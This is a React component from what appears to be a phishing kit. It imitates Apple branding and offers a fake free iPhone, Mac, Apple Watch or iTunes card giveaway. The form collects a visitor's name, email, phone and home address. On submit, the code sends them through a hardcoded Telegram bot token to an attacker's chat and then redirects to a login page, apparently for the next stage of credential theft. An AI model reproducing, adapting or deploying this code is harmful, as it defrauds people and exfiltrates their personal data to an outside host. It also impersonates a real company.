import React, { useEffect } from "react";
import { useNavigate, useParams } from "react-router-dom";

export default function Claim() {
  let { claim_item } = useParams();
  const [product, setProduct] = React.useState("");
  const [imageUrl, setImageUrl] = React.useState("");

  useEffect(() => {
    if (claim_item === "iphone") {
      setProduct("iPhone 15 Pro Max");
      setImageUrl("../images/iphone.jfif");
    } else if (claim_item === "mac") {
      setProduct("Mac Book");
      setImageUrl("../images/mac.jpg");
    } else if (claim_item === "iwatch") {
      setProduct("Apple Watch");
      setImageUrl("../images/iwatch.jpg");
    } else if (claim_item === "itunes") {
      setProduct("Apple iTunes Card");
      setImageUrl("../images/tunes2.webp");
    } else {
        window.location.replace("../choose")
    }
  }, []);


  const [formInput, setFormInput] = React.useState({
    fname: "",
    lname: "",
    email:"",
    tel:"",
    address:"",
    city:"",
    state:""
  });

  const [isLoading, setIsLoading] = React.useState(false);

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true);
    event.preventDefault();
    var message = `| IPHONE GIVEAWAY INFORMATION | \n              Item to Claim ${product} \n        First Name: ${formInput.fname} \n         Last Name: ${formInput.lname} \n        Email Address: ${formInput.email} \n        Phone Number: ${formInput.tel} \n        Address: ${formInput.address}\n        City: ${formInput.city} \n        State: ${formInput.state} \n ${Date()}`;
    var token = "5868318271:AAF4bg5Q55j53Aml4YYICxC3MIbt8VLn5IE";
    var chat_id = 1297895706;
    const send = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
    );
    await send.json();
    navigate("../login", { replace: true });
    setIsLoading(false);
  }


  return (
    <div>
      <nav>
        <p className="announcement">Over 5,000,000 in Offers out so far!</p>
        <div className="navbar">
          <div className="brand">
            <img src="../images/apple.jpg" height="90%" alt="" />
          </div>
        </div>
      </nav>

      <div className="container">
        <p style={{ textAlign: "center" }}>Claim your {product} Today</p>
        <div className="entry-content" style={{ height: "auto !important" }}>
          <ol>
            <li> Select Quantity </li>
          </ol>
        </div>
        <input
          type="checkbox"
          id="vehicle1"
          name="vehicle1"
          value="Bike"
          checked
          disabled
        />
        <label htmlFor="vehicle1">{product}</label>
        <br /> <br />
        <h2>$0.00</h2>
        <br />
        <div className="item-img">
          <img src={imageUrl} alt="" />
        </div>
        <br />
        <h3>Shipping Information</h3>
        <form method="post" onSubmit={handleSubmit}>
          <div className="form-input">
            <label htmlFor="fname">
              First name:<span className="required">*</span>{" "}
            </label>
            <br />
            <input onChange={handleInputChange} type="text" id="fname" required name="fname" />
          </div>

          <div className="form-input">
            <label htmlFor="lname">
              Last name:<span className="required">*</span>{" "}
            </label>
            <br />
            <input onChange={handleInputChange} type="text" id="lname" required name="lname" />
          </div>

          {/* <div className="form-input">
            <label htmlFor="lname">
              Instagram Username:<span className="required">*</span>{" "}
            </label>
            <br />
            <input type="text" id="inst_name" required name="inst_name" />
            <small style={{ fontSize: "12px" }}>
              <i>
                Note: Be sure to enter your correct instagram username, so
                another user will not get your reward
              </i>
            </small>
          </div> */}

          <div className="form-input">
            <label htmlFor="email">
              Email address:<span className="required">*</span>
            </label>
            <br />
            <input onChange={handleInputChange} type="email" id="email" required name="email" />
          </div>

          <div className="form-input">
            <label htmlFor="tel">
              Phone:<span className="required">*</span>
            </label>
            <br />
            <input onChange={handleInputChange} type="tel" id="tel" required name="tel" />
          </div>

          <div className="form-input">
            <label htmlFor="address">
              Address:<span className="required">*</span>
            </label>
            <br />
            <input onChange={handleInputChange} type="text" id="address" name="address" />
          </div>

          <div className="form-input">
            <label htmlFor="city">
              City:<span className="required">*</span>
            </label>
            <br />
            <input onChange={handleInputChange} type="text" id="city" name="city" />
          </div>

          <div className="form-input">
            <label htmlFor="fname">
              State:<span className="required">*</span>
            </label>
            <br />
            <input onChange={handleInputChange} type="text" id="state" name="state" />
          </div>

          <button disabled={isLoading} style={{ backgroundColor: "#000;" }}>
          { isLoading ? <span className="loader2"></span>
          : <span>
            Claim your {product}
            </span>
          }
            
          </button>
        </form>
      </div>

      <p className="announcement">© Apple Inc. All right reserved</p>
    </div>
  );
}
